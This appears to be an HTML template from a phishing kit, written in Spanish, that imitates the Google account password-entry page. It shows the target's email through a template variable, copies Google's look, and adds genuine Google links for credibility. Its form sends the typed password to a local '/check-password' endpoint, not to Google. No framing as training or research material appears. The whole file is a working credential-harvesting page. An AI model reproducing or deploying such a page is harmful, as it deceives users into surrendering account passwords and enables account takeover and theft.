<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Introduce tu contraseña - Cuenta de Google</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #4285f4 0%, #34a853 20%, #fbbc05 40%, #ea4335 60%, #4285f4 80%);
            background-size: 400% 400%;
            animation: gradient 15s ease infinite;
            min-height: 100vh;
            color: #202124;
        }
        
        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        .header {
            padding: 20px 30px;
            text-align: right;
        }
        
        .header a {
            color: white;
            text-decoration: none;
            margin-left: 20px;
            font-size: 13px;
            opacity: 0.9;
        }
        
        .main-container {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: calc(100vh - 80px);
            padding: 20px;
        }
        
        .form-card {
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 448px;
            padding: 48px 40px 36px;
        }
        
        .user-info {
            display: flex;
            align-items: center;
            background: #f8f9fa;
            padding: 16px;
            border-radius: 10px;
            margin-bottom: 28px;
        }
        
        .avatar {
            width: 48px;
            height: 48px;
            background: #1a73e8;
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 16px;
            font-weight: 500;
            font-size: 20px;
        }
        
        .email-display {
            font-size: 17px;
            font-weight: 500;
            flex-grow: 1;
        }
        
        .change-account {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
        }
        
        .change-account:hover {
            text-decoration: underline;
        }
        
        .title {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 36px;
            color: #202124;
        }
        
        .input-container {
            margin-bottom: 24px;
        }
        
        .google-input {
            width: 100%;
            padding: 16px 14px;
            font-size: 16px;
            border: 2px solid #dadce0;
            border-radius: 8px;
            transition: all 0.2s;
            background: #f8f9fa;
        }
        
        .google-input:focus {
            outline: none;
            border-color: #1a73e8;
            background: white;
            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.1);
        }
        
        .password-options {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 48px;
        }
        
        .show-password {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
            color: #5f6368;
        }
        
        .forgot-password {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
        }
        
        .forgot-password:hover {
            text-decoration: underline;
        }
        
        .button-group {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .back-button {
            color: #1a73e8;
            text-decoration: none;
            padding: 10px 16px;
            border-radius: 6px;
            font-weight: 500;
            transition: background 0.2s;
        }
        
        .back-button:hover {
            background: #f8f9fa;
        }
        
        .next-button {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 12px 28px;
            font-size: 14px;
            font-weight: 500;
            border-radius: 6px;
            cursor: pointer;
            transition: background 0.2s;
        }
        
        .next-button:hover {
            background: #0d62d9;
            box-shadow: 0 2px 6px rgba(26, 115, 232, 0.3);
        }
        
        @media (max-width: 480px) {
            .form-card {
                padding: 32px 24px;
            }
            
            .user-info {
                flex-direction: column;
                text-align: center;
                gap: 12px;
            }
            
            .avatar {
                margin-right: 0;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <a href="https://accounts.google.com/signup" target="_blank">Crear cuenta</a>
        <a href="https://mail.google.com" target="_blank">Gmail</a>
        <a href="https://images.google.com" target="_blank">Imágenes</a>
    </div>
    
    <div class="main-container">
        <div class="form-card">
            <div class="user-info">
                <div class="avatar">{{ email[0].upper() if email else 'U' }}</div>
                <div class="email-display">{{ email }}</div>
                <a href="/" class="change-account">Cambiar de cuenta</a>
            </div>
            
            <h1 class="title">Introduce tu contraseña</h1>
            
            <form action="/check-password" method="post">
                <div class="input-container">
                    <input type="password" class="google-input" name="password" placeholder="Introduce tu contraseña" required autofocus id="passwordInput">
                </div>
                
                <div class="password-options">
                    <div class="show-password">
                        <input type="checkbox" id="showPassword">
                        <label for="showPassword">Mostrar contraseña</label>
                    </div>
                    <a href="https://accounts.google.com/signin/recovery" class="forgot-password" target="_blank">
                        ¿Has olvidado tu contraseña?
                    </a>
                </div>
                
                <div class="button-group">
                    <a href="/" class="back-button">Atrás</a>
                    <button type="submit" class="next-button">Siguiente</button>
                </div>
            </form>
        </div>
    </div>
    
    <script>
        document.getElementById('showPassword').addEventListener('change', function() {
            const passwordInput = document.getElementById('passwordInput');
            passwordInput.type = this.checked ? 'text' : 'password';
        });
    </script>
</body>
</html>
